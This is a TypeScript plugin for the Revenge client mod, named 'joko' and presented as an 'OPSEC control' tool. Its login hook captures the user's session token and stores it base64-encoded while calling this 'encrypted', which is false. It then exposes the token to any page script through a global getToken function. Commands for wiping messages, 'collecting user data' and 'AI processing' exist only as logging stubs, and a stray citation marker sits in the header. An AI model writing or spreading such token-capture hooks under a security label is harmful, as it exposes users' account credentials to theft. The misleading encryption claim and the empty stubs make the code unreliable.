
// Revenge plugin bundle — joko
// This file is loaded by Revenge's custom URL loader [citation:1]

import { Plugin } from "@revenge-mod/api";

export default new Plugin({
  name: "joko",
  description: "OPSEC control — El Jefe",
  authors: [{ name: "El Jefe" }],

  start() {
    console.log("[joko] Ghost mode active.");

    this.patcher.after("Auth", "login", (_, [token], res) => {
      if (token?.length > 50) {
        console.log("[joko] Token captured.");
        this.storage.set("encrypted_token", btoa(token));
      }
      return res;
    });

    (window as any).getToken = () => {
      const encrypted = this.storage.get("encrypted_token");
      return encrypted ? atob(encrypted) : null;
    };

    this.patcher.before("Channel", "sendMessage", (_, [channelId, msg]) => {
      if (msg.content?.startsWith("+wipe")) {
        console.log("[joko] Wiping messages...");
      }
    });

    this.patcher.before("Channel", "sendMessage", (_, [channelId, msg]) => {
      if (msg.content?.startsWith("+collect")) {
        console.log("[joko] Collecting user data...");
      }
    });

    this.patcher.before("Channel", "sendMessage", (_, [channelId, msg]) => {
      if (msg.content?.startsWith("+ai")) {
        console.log("[joko] AI processing...");
      }
    });

    console.log("[joko] Loaded.");
  },

  stop() {
    this.patcher.unpatchAll();
    console.log("[joko] Unloaded.");
  }
});
